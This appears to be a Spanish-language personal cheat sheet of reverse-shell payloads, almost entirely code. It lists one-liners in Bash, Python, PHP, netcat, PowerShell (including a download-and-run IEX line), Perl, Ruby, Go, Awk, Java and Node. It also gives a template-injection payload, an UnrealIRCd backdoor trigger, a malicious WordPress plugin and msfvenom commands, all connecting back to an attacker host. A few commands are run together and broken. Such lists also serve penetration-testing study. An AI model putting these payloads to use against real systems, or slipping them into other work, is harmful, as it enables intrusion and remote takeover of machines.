# Reverse Shell Cheat Sheet

<img src="https://i.imgur.com/5FnebYn.png" alt="Tunneling Red Team" width="400" height="300">



Una reverse shell es una técnica ampliamente utilizada en ciberseguridad que permite a un atacante tomar el control de un sistema comprometido y acceder a él de forma remota. Básicamente, una vez que el atacante ha logrado acceder al sistema, establece una conexión de red inversa entre el sistema comprometido y su propia máquina, lo que le permite ejecutar comandos de manera remota y controlar el sistema.
# **Contexto**

En estas notas personales, he recopilado posiblemente las mejores formas de obtener una Reverse Shell según mi experiencia. Algunas de ellas son experimentos propios que han funcionado, y también he recopilado algunas otras formas de obtener una conexión reversa. Esta lista práctica podría ser una de las mejores guías sobre cómo establecer una Reverse Shell.
## **Bash**

```
bash -i >& /dev/tcp/10.10.10.10/443 0>&1

bash -c "bash -i >& /dev/tcp/10.10.10.10/443 0>&1"

0<&196;exec 196<>/dev/tcp/10.10.10.10/443; sh <&196 >&196 2>&196

bash -l > /dev/tcp/10.10.10.10/443 0<&1 2>&1

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F443%200%3E%261%22
```

## **Python**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);’

export RHOST="10.10.10.10";export RPORT=443;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

## **Php**

```
<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f"); ?>

php -r '$sock=fsockopen("10.10.10.10",443);`/bin/sh -i <&3 >&3 2>&3`;'

php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.10.10.10",443);system("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.10.10.10",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

php -r '$sock=fsockopen("10.10.10.10",443);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
```

## **NetCat**

```
ncat 10.10.10.10 443 -e /bin/bash

nc -c /bin/sh 10.10.10.10 443

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 443 >/tmp/f

nc.exe -e cmd 10.10.10.106 443

nc -e /bin/sh 10.10.10.10 443

rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.10.10%20443%20%3E%2Ftmp%2Ff
```

## **Node**

```
require('child_process').exec('bash -i >& /dev/tcp/10.10.10.10/443 0>&1');

<audio src*=x* onerror="const exec= require('child_process').exec;exec('nc -e 3 192.168.111.129 1337 < /bin/bash', (e, stdout, stderr)=> { if (e instanceof Error) {console.error(e); throw e; } console.log('stdout ', stdout);console.log('stderr ', stderr);});alert('1')">
```

## **Telnet**

```
rm -f /tmp/p; mknod /tmp/p p && telnet 10.10.10.10 443 0/tmp/p

telnet 10.10.10.10 80 | /bin/bash | telnet 10.10.10.10 443
```

## **Java**

```
r = Runtime.getRuntime()p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.10.10/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()
```

## **PowerShell**

```
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.10.10.10",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8000/reverse.ps1')
```

## **Xterm**

```
xterm -display 10.10.10.10:443
```

## **Perl**

```
perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

## **Server Side Template Injection**

```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

## **UnrealIRCd**

```
echo "AB;nc -e /bin/sh 10.10.10.10 443" |nc 192.168.1.3 6667
```

## **Any Plugin Php**

```
<?php

/**
* Plugin Name: Shelly
* Plugin URI: http://localhost
* Description: Love Shelly
* Version: 1.0
* Author: d4t4s3c
* Author URI: https://github.com/d4t4s3c
*/

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'");
?>
```

## **October**

```
function onstart(){    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/443 0>&1'");}
```

## **Jenkins**

```
String host="10.10.10.10";
int port=443;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## **Golang**

```
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.10.10:443");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## **Awk**

```
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

## **Ruby**

```
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",443).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.10.10","443");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

# **Msfvenom**

## Php Payloads

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > reverse.php

msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=443 -f raw > reverse.php
```

## Jar Payload

```
msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f jar > reverse.Jar
```

## Jsp Payload

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f raw > reverse.jsp
```

## War

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f war > reverse.war
```

## ASPX Payload

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f aspx -o reverse.aspx
```

## Linux Payloads

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf > reverse.elf

msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf > reverse.elfmsfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f elf > reverse.elf\
```

## Windows Payloads
## 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > reverse.exemsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > reverse.exe

msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe > reverse.exe
```

### Recursos
https://www.revshells.com
